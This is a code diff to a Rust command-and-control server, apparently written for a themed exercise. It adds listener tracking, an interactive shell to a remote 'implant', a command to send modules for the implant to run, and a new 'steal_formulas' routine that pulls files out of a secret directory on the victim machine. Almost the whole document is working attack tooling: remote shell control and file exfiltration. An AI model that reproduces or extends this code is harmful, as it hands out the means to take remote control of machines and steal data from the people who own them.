@@ -28,14 +28,15 @@ fn main() {
     banner();
 
     //Vec<(ID, PORT, PROTOCOL, )>
-    let mut listen_tracker: Vec<(u64, u16, String/* , Arc<Mutex<SharedBuffer>>, u16*/)> = Vec::new();
+    let mut listen_tracker: Vec<(u64, u16, String)> = Vec::new();
+    let mut anchovy_list: Vec<(Vec<(u64, u16, String)>, Arc<Mutex<SharedBuffer>>)> = Vec::new();
     let mut relay_port = 2000;
     let mut sb_arc = Arc::new(Mutex::new(SharedBuffer {
         cc: 0,
         buff: [0; 2048].to_vec(),
     }));
     //Defaults
-    let mut protocol: u16 = 1;
+    let mut protocol: u16 = 2;
     let mut listen_port: u16 = 2120;
     let mut local_address = SocketAddr::from(([127, 0, 0, 1], listen_port));
     let mut curr_module = String::new();
@@ -136,7 +137,9 @@ fn main() {
                     println!("Select a valid module!");
                 }
             }
-
+            else if current_cmd.eq("steal_formulas"){
+                sb_arc = Arc::clone(&steal_formulas(sb_arc.clone()));
+            }
             else if current_cmd.contains("set") {
                 // look for all commands that contain set
                 let mut command = current_cmd.split(' ');
@@ -276,15 +279,10 @@ fn create_anchovy() {
 
 
 // open listener
-fn open_crusty_crab(tracker: &mut Vec<(u64, u16, String)>, relay_port: u16, address: SocketAddr, prot_type: u16) -> Arc<Mutex<SharedBuffer>>{
-    // let mut local: String = "127.0.0.1:".to_owned();
-    // local.push_str(&relay_port.to_string()[..]);
-    // let relay = UdpSocket::bind(local).unwrap();
-    // tracker.push(((tracker.len() as u64) + 1, relay_port, relay));
-    
-    
+fn open_crusty_crab(listeners: &mut Vec<(u64, u16, String)>, relay_port: u16, address: SocketAddr, prot_type: u16) -> Arc<Mutex<SharedBuffer>>{
+
     //Create a new listener
-    let mut new_listen = new_lsn(tracker.len() as u64);
+    let mut new_listen = new_lsn(listeners.len() as u64);
     let mut protocol = "udp";
     if prot_type == 1{
         protocol = "udp";
@@ -293,7 +291,7 @@ fn open_crusty_crab(tracker: &mut Vec<(u64, u16, String)>, relay_port: u16, addr
     else if prot_type == 2{
         protocol = "tcp";
     }
-    tracker.push(((tracker.len() as u64) + 1, relay_port, protocol.to_string()));
+    listeners.push(((listeners.len() as u64) + 1, relay_port, protocol.to_string()));
     
     //Create the shared buff and clone 
     let mut sb: Arc<Mutex<SharedBuffer>> = Arc::new(Mutex::new(SharedBuffer {
@@ -314,6 +312,8 @@ fn open_crusty_crab(tracker: &mut Vec<(u64, u16, String)>, relay_port: u16, addr
 }
 
 
+// Creates interactive shell with implant
+// Exit shell with "exit" or "Exit"
 fn shell(sb: Arc<Mutex<SharedBuffer>>) -> Arc<Mutex<SharedBuffer>>{
     let mut code: u8 = 5;
     if true {
@@ -368,6 +368,8 @@ fn shell(sb: Arc<Mutex<SharedBuffer>>) -> Arc<Mutex<SharedBuffer>>{
     
 }
 
+
+// Sends command for implant to execute module 
 fn send_module(sb: Arc<Mutex<SharedBuffer>>, module: &str) -> Arc<Mutex<SharedBuffer>>{
     let mut code: u8 = 6;
     if true {
@@ -396,16 +398,62 @@ fn send_module(sb: Arc<Mutex<SharedBuffer>>, module: &str) -> Arc<Mutex<SharedBu
                 break;
             }
         }
-
-        // wait until shared buffer changes
-        // print changed shared buffer
         thread::sleep(time::Duration::from_millis(10));
     }
 
+    // 101 code keeps implant connected
+    // but goes back to main loop
     let mut code: u8 = 101;
     if true {
         let mut buffer = sb.lock().unwrap();
         buffer.cc = code;
     }
     return sb;
+}
+
+
+// Exfil files in .secret_formulas dir
+// Modules should check if dir is already created, if not create dir 
+// Similar code to shell/module (no read in "if swap")
+fn steal_formulas(sb: Arc<Mutex<SharedBuffer>>) -> Arc<Mutex<SharedBuffer>>{
+
+    let mut code: u8 = 7;
+    if true {
+        let mut buffer = sb.lock().unwrap();
+        buffer.cc = code;
+    }
+    let mut memo: String = String::new();
+    let mut swap = true;
+    loop {
+        if swap {
+            io::stdout().flush().unwrap();
+            // write to shared buffer
+            let mut buffer = sb.lock().unwrap();
+            buffer.cc = 7;
+            buffer.buff = memo.as_bytes().to_vec();
+            swap = false;
+        }
+        else {
+            let mut buffer = sb.lock().unwrap();
+            if !String::from_utf8_lossy(&buffer.buff[..]).contains(memo.as_str()) {
+                let mut write_string = String::from_utf8_lossy(&buffer.buff[..]);
+                println!("{}", String::from_utf8_lossy(&buffer.buff[..]));
+                io::stdout().flush().unwrap();
+                memo = String::new();
+                break;
+            }
+            break;
+        }
+        thread::sleep(time::Duration::from_millis(10));
+    }
+    
+    // 101 code keeps implant connected
+    // but goes back to main loop
+    let mut code: u8 = 101;
+    if true {
+        let mut buffer = sb.lock().unwrap();
+        buffer.cc = code;
+    }
+    return sb;
+
 }
